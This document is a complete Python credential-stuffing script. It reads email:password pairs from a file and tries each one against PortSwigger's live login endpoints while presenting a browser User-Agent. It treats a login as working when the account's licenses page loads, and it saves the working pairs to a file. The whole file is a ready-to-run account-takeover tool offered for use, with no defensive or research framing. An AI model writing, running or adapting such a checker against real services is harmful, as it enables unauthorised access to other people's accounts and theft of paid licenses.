#!/usr/bin/env python3
"""
PortSwigger Login Checker - Validate credentials
Check if email:password pairs work for PortSwigger
"""

import requests
import re
import sys
from datetime import datetime

INPUT_FILE = "portswigger_credentials.txt"
OUTPUT_FILE = "portswigger_valid_creds.txt"
FAILED_FILE = "portswigger_invalid_creds.txt"

LOGIN_URL = "https://portswigger.net/users"
LOGIN_POST_URL = "https://login.portswigger.net/u/login"
LICENSES_URL = "https://portswigger.net/users/youraccount/licenses"

class PortSwiggerChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        self.session.timeout = 30

    def extract_form_fields(self, html):
        """Extract all form fields from login form"""
        fields = {}
        for match in re.finditer(r'<input[^>]*>', html):
            input_tag = match.group(0)
            name_match = re.search(r'name=["\']?([^"\'>\s]+)', input_tag, re.IGNORECASE)
            if name_match:
                name = name_match.group(1)
                value_match = re.search(r'value=["\']?([^"\'>\s]*)', input_tag, re.IGNORECASE)
                value = value_match.group(1) if value_match else ""
                fields[name] = value
        return fields

    def check_login(self, email, password):
        """Check if credentials are valid"""
        try:
            # Get login page
            resp1 = self.session.get(LOGIN_URL, timeout=30)
            if resp1.status_code != 200:
                return False, "login_page_error"

            # Extract all form fields
            form_fields = self.extract_form_fields(resp1.text)
            if not form_fields:
                return False, "no_form_fields"

            # Update with credentials
            form_fields['username'] = email
            form_fields['password'] = password

            # POST credentials
            resp2 = self.session.post(LOGIN_POST_URL, data=form_fields, timeout=30, allow_redirects=True)

            # Check HTTP status
            if resp2.status_code >= 400:
                return False, f"http_{resp2.status_code}"

            # Check if login failed
            if "Wrong email or password" in resp2.text or "Invalid email or password" in resp2.text:
                return False, "invalid_creds"

            # Check if still on login page
            if "name=\"state\"" in resp2.text and LOGIN_POST_URL in resp2.url:
                return False, "login_failed"

            # Try to access licenses page to confirm auth
            resp3 = self.session.get(LICENSES_URL, timeout=30)
            if resp3.status_code == 200:
                return True, "success"
            else:
                return False, "access_denied"

        except requests.exceptions.Timeout:
            return False, "timeout"
        except requests.exceptions.ConnectionError:
            return False, "connection_error"
        except Exception as e:
            return False, f"error: {str(e)}"

def read_credentials(filename):
    """Read credentials from file"""
    creds = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        creds.append(line)
        if not creds:
            print(f"ERROR: No credentials found in {filename}")
            sys.exit(1)
        return creds
    except FileNotFoundError:
        print(f"ERROR: File not found: {filename}")
        sys.exit(1)

def main():
    print("[*] PortSwigger Login Checker")
    print(f"[*] Input: {INPUT_FILE}")
    print(f"[*] Valid: {OUTPUT_FILE}")
    print(f"[*] Invalid: {FAILED_FILE}")
    print("")

    # Read credentials
    print("Step 1: Reading credentials...")
    creds = read_credentials(INPUT_FILE)
    print(f"✓ Loaded {len(creds)} credentials")
    print("")

    # Initialize checker
    checker = PortSwiggerChecker()

    # Check credentials
    print("Step 2: Checking logins...")
    valid_creds = []
    invalid_creds = []

    for idx, cred in enumerate(creds, 1):
        email, password = cred.split(':', 1)
        sys.stdout.write(f"\r[{idx}/{len(creds)}] Checking... Valid: {len(valid_creds)}")
        sys.stdout.flush()

        is_valid, reason = checker.check_login(email, password)

        if is_valid:
            valid_creds.append((email, password, reason))
        else:
            invalid_creds.append((email, password, reason))

    print(f"\r[{len(creds)}/{len(creds)}] Checking... Valid: {len(valid_creds)}    ")
    print("")

    # Write results
    print("Step 3: Writing results...")

    # Write valid credentials
    with open(OUTPUT_FILE, 'w') as f:
        f.write(f"# Valid PortSwigger Credentials\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(valid_creds)}\n")
        f.write(f"#\n")
        for email, password, reason in valid_creds:
            f.write(f"{email}:{password}\n")

    # Write invalid credentials
    with open(FAILED_FILE, 'w') as f:
        f.write(f"# Invalid PortSwigger Credentials\n")
        f.write(f"# Generated: {datetime.now().isoformat()}\n")
        f.write(f"# Total: {len(invalid_creds)}\n")
        f.write(f"#\n")
        for email, password, reason in invalid_creds:
            f.write(f"{email}:{password} # {reason}\n")

    print(f"✓ Valid: {OUTPUT_FILE}")
    print(f"✓ Invalid: {FAILED_FILE}")
    print("")

    # Summary
    print("============================================================")
    print("LOGIN CHECK COMPLETE")
    print("============================================================")
    print(f"Total checked: {len(creds)}")
    print(f"Valid: {len(valid_creds)}")
    print(f"Invalid: {len(invalid_creds)}")
    if len(creds) > 0:
        print(f"Success rate: {len(valid_creds)*100/len(creds):.1f}%")
    print("============================================================")

if __name__ == "__main__":
    main()
